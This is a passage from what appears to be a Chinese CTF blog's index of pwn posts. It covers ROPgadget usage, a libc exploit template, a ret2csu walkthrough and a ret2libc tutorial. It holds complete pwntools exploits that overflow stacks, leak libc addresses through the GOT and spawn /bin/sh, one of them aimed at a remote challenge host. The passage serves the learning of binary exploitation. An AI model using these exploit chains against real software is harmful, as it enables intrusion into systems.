class="token punctuation">[</span><span class="token operator">--</span>norop<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>nojop<span class="token punctuation">]</span>                 <span class="token punctuation">[</span><span class="token operator">--</span>callPreceded<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>nosys<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>multibr<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>all<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>noinstr<span class="token punctuation">]</span>                 <span class="token punctuation">[</span><span class="token operator">--</span>dump<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">-h, --help           显示帮助文档-v, --version        版本号-c, --checkUpdate    检测新版本是否可用--binary &lt;binary&gt;    指定二进制文件进行分析--opcode &lt;opcodes&gt;   在可执行段中查找opcode--string &lt;string&gt;    在可读的段中查找字符串--memstr &lt;string&gt;    查找单个byte在所有的可执行段中--depth &lt;nbyte&gt;      搜索引擎的深度--only &lt;key&gt;         只显示特别的指令--filter &lt;key&gt;       过滤特定指令--range &lt;start-end&gt;  在地址之间寻找(0x...-0x...)--badbytes &lt;byte&gt;    拒绝特定指令在gadget的地址下--rawArch &lt;arch&gt;     指定文件架构--rawMode &lt;mode&gt;     指定源文件的mode--rawEndian &lt;endian&gt; 指定源文件的endianness--re &lt;re&gt;            正则表达式--offset &lt;hexaddr&gt;   指定gadget的地址偏移--ropchain           ROP chain的生成--thumb              在ARM架构下使用搜索引擎thumb 模式--console            使用交互终端对于搜索引擎--norop              禁止ROP搜索引擎--nojop              禁止JOP搜索引擎--callPreceded       仅显示call-preceded的gadgets--nosys              禁止SYS搜索引擎--multibr            允许多分枝gadgets--all                禁止删除重复的gadgets，即显示所有--noinstr            禁止gadget指令终端打印--dump               输出gadget bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;查找可存储寄存器的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary rop --string &quot;&#x2F;bin&#x2F;sh&quot;查找字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary rop  --only &#39;int&#39;查找有int 0x80的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中rop是二进制文件名</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-libc_about_exp</title>
      <link href="//post/pwn-libc-about-exp.html"/>
      <url>//post/pwn-libc-about-exp.html</url>
      
        <content type="html"><![CDATA[<h1 id="关于和libc有关的exp编写规则"><a href="#关于和libc有关的exp编写规则" class="headerlink" title="关于和libc有关的exp编写规则"></a>关于和libc有关的exp编写规则</h1><span id="more"></span><h2 id="0x00正确的exp范例"><a href="#0x00正确的exp范例" class="headerlink" title="0x00正确的exp范例"></a>0x00正确的exp范例</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc_32.so.6'</span><span class="token punctuation">)</span><span class="token comment">#p = process('./level3')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.200.241.244'</span><span class="token punctuation">,</span><span class="token string">'39910'</span><span class="token punctuation">)</span>main_addr<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>sys_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>payload1<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>payload1<span class="token operator">+=</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>write_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>offset<span class="token operator">=</span>write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>sys_addr<span class="token operator">=</span>offset<span class="token operator">+</span>sys_libcbinsh<span class="token operator">=</span>offset<span class="token operator">+</span>binsh_libcpayload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>payload2<span class="token operator">+=</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-exp的相关规范"><a href="#0x01-exp的相关规范" class="headerlink" title="0x01 exp的相关规范"></a>0x01 exp的相关规范</h2><p>引入elf文件使用<code>elf=ELF(&#39;thsi_is_a_elf_file&#39;)</code></p><p>引入libc文件使用<code>libc=ELF(&#39;this_is_a_libc_file.so.6&#39;)</code></p><p>在elf文件中含有的函数</p><ol><li>若需要plt表项<code>write_plt=elf.plt[&#39;write&#39;]</code></li><li>若需要got表项<code>write_got=elf.got[&#39;write&#39;]</code></li><li>若需要其他函数<code>main_addr=elf.sym[&#39;main&#39;]</code></li></ol><p>在libc文件中含有的函数或者字符串</p><ol><li>函数<code>system_libc=libc.sym[&#39;system&#39;]</code></li><li>字符串<code>binsh_libc=libc.search(&quot;/bin/sh&quot;).next()</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-ret2csu</title>
      <link href="//post/pwn-ret2csu.html"/>
      <url>//post/pwn-ret2csu.html</url>
      
        <content type="html"><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在64位程序中, 函数调用的前六个参数是通过寄存器传参的(<code>rdi, rsi, rdx, rcx, r8, r9</code>), 其余的参数才是通过压栈的形式传参. 但是一般在程序中很少有连续的这么多pop寄存器的gadgets, 这时候就需要利用到libc的初始化函数:<code>__libc_csu_init</code>, 这个函数只要调用了libc就有, 而大部分程序都会调用libc, 所以这个函数在绝大部分程序中都会出现. </p><span id="more"></span><p>函数的二进制形式如下:(不同libc版本大致相同)</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:00000000004005A0 ; void _libc_csu_init(void).text:00000000004005A0                 public __libc_csu_init.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o.text:00000000004005A0.text:00000000004005A0 var_30          &#x3D; qword ptr -30h.text:00000000004005A0 var_28          &#x3D; qword ptr -28h.text:00000000004005A0 var_20          &#x3D; qword ptr -20h.text:00000000004005A0 var_18          &#x3D; qword ptr -18h.text:00000000004005A0 var_10          &#x3D; qword ptr -10h.text:00000000004005A0 var_8           &#x3D; qword ptr -8.text:00000000004005A0.text:00000000004005A0 ; __unwind &#123;.text:00000000004005A0                 mov     [rsp+var_28], rbp.text:00000000004005A5                 mov     [rsp+var_20], r12.text:00000000004005AA                 lea     rbp, cs:600E24h.text:00000000004005B1                 lea     r12, cs:600E24h.text:00000000004005B8                 mov     [rsp+var_18], r13.text:00000000004005BD                 mov     [rsp+var_10], r14.text:00000000004005C2                 mov     [rsp+var_8], r15.text:00000000004005C7                 mov     [rsp+var_30], rbx.text:00000000004005CC                 sub     rsp, 38h.text:00000000004005D0                 sub     rbp, r12.text:00000000004005D3                 mov     r13d, edi.text:00000000004005D6                 mov     r14, rsi.text:00000000004005D9                 sar     rbp, 3.text:00000000004005DD                 mov     r15, rdx.text:00000000004005E0                 call    _init_proc.text:00000000004005E5                 test    rbp, rbp.text:00000000004005E8                 jz      short loc_400606.text:00000000004005EA                 xor     ebx, ebx.text:00000000004005EC                 nop     dword ptr [rax+00h].text:00000000004005F0.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j.text:00000000004005F0                 mov     rdx, r15.text:00000000004005F3                 mov     rsi, r14.text:00000000004005F6                 mov     edi, r13d.text:00000000004005F9                 call    qword ptr [r12+rbx*8].text:00000000004005FD                 add     rbx, 1.text:0000000000400601                 cmp     rbx, rbp.text:0000000000400604                 jnz     short loc_4005F0.text:0000000000400606.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j.text:0000000000400606                 mov     rbx, [rsp+38h+var_30].text:000000000040060B                 mov     rbp, [rsp+38h+var_28].text:0000000000400610                 mov     r12, [rsp+38h+var_20].text:0000000000400615                 mov     r13, [rsp+38h+var_18].text:000000000040061A                 mov     r14, [rsp+38h+var_10].text:000000000040061F                 mov     r15, [rsp+38h+var_8].text:0000000000400624                 add     rsp, 38h.text:0000000000400628                 retn.text:0000000000400628 ; &#125; &#x2F;&#x2F; starts at 4005A0.text:0000000000400628 __libc_csu_init endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，利用0x4005f0处的代码将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx*8]，这时候将rbx赋值0，可以将想调用的函数地址传给r12。执行完函数之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1。</p><p>rbx 0</p><p>rbp 1</p><p>r12 想调用的函数地址</p><p>r13 -&gt;edi 函数第三个参数 </p><p>r14 -&gt;rsi 函数第二个参数</p><p>r15 -&gt;rdx 函数第一个参数</p><h2 id="利用顺序"><a href="#利用顺序" class="headerlink" title="利用顺序"></a>利用顺序</h2><p>我们主要利用顺序如下:</p><ol><li><code>0x0000000000400606~0000000000400628</code>, (利用栈溢出构造栈上数据)依次修改<code>rbx, rbp, r12, r13, r14, r15</code>六个寄存器的值.(这里需要注意的是rsp是栈顶指针, 可能不是从rsp开始压入rbx, 上面的<code>var_30</code>就是从<code>rsp+8</code>开始压栈的, 所以写payload的时候需要加上一个<code>p64(0)</code>)</li><li>上面修改的寄存器的值是为接下来的<code>0x00000000004005F0~0x0000000000400604</code>这段代码服务的, 我们通过修改<code>rdx, rsi, edi</code>的值来当做下一步<code>call qword ptr [r12+rbx*8]</code>的参数, 这样只要我们把rbx设为0, 把r12的值设为我们想要跳转到函数的got地址即可.</li><li><code>0x000000000040060D~0x0000000000400614</code>, 我们为了不让它循环(往下执行), 而在上面已经把rbx设为0, 因此需要在第1步把rbp的值设为1</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'level5'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span> write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>read_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>main_addr<span class="token operator">=</span><span class="token number">0x400564</span>payload1<span class="token operator">=</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span><span class="token comment">#                            pop_junk  rbx     rbp       r12        r13         r14       r15         ret</span>payload1<span class="token operator">+=</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x38</span>payload1<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload1#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>write_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr<span class="token operator">=</span>write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bss_addr<span class="token operator">=</span><span class="token number">0x601028</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>payload2<span class="token operator">=</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span><span class="token comment">#                       pop_junk    rbx      rbp         r12          r13         r14          r15         ret</span>payload2<span class="token operator">+=</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload2#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>payload3<span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment">#                          pop_junk    rbx      rbp         r12       r13("/bin/sh\0")   r14     r15         ret</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload3#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-libc</title>
      <link href="//post/pwn-libc.html"/>
      <url>//post/pwn-libc.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn-libc"></a>pwn-libc</h1><p>在众多ROP方法中，重点是要找到system函数的地址来进行ROP，而有的elf源文件中并没有system函数，这是就可以利用libc</p><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>为了得到libc中某函数的地址，多数采用 got 表泄露，即输出某个函数对应的 got 表项的内容。</p><p><strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><span id="more"></span><h2 id="got-amp-plt表"><a href="#got-amp-plt表" class="headerlink" title="got&amp;plt表"></a>got&amp;plt表</h2><p>获取数据段存放函数地址的那一小段代码称为PLT（Procedure Linkage Table）<strong>过程链接表</strong></p><p>存放函数地址的数据段称为GOT（Global Offset Table）<strong>全局偏移表</strong>。</p><p>当操作系统执行到scanf函数时，一般的调用即为：<strong>call scanf —&gt; scanf的plt表 —&gt;scanf的got表</strong></p><p>即间接寻址可简化为下图</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4bce71d0afff9fda662855b7058cbff9654bf8a6.png"></p><h2 id="ctfWiki-ret2libc3"><a href="#ctfWiki-ret2libc3" class="headerlink" title="ctfWiki  ret2libc3"></a>ctfWiki  ret2libc3</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先分析保护</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/18f4dd2967c898314a3d79a7069a23c91b491c7d.png"></p><p>反汇编</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/edaf04621f07afcf30213dc71792080b2bc436c6.png"></p><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p><p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul><p>下面逐步分析</p><p>首先利用程序中的puts函数可以打印我们需要的东西，且puts也是程序必然会使用的函数，即我们可以利用泄露puts的地址来计算system函数的地址。</p><p>故利用gets函数的栈溢出漏洞，覆盖gets函数的返回地址为puts，puts的返回地址为_start函数（因为我们需要执行程序两次，第一次泄露libc，第二次执行ROP），puts的参数为puts函数的got表</p><p>通过gdb调试得知需要覆盖112个字符（含ebp）</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/c9c5e372d6870c9dbdf6c9c0b93913f8da086ad2.png"></p><p>则得出payload1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload1 <span class="token operator">=</span> <span class="token string">"zbrnb"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后程序便会打印出puts的got表，使用u32解包</p><p>之后libc.address即为得到的地址减去libc.symbols[‘puts’]</p><p>即得到payload2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload2 <span class="token operator">=</span> <span class="token string">"zbrnb"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ctfWiki上的给的exp在本地跑不通，我也不知道为啥</span><span class="token comment">#这是一个可以本地跑通的脚本</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcputs_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>start_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#32位程序，地址占4个字节</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'CCCC'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="USCTF-ret2libc"><a href="#USCTF-ret2libc" class="headerlink" title="USCTF ret2libc"></a>USCTF ret2libc</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>反汇编寻找泄漏点</p><p><img 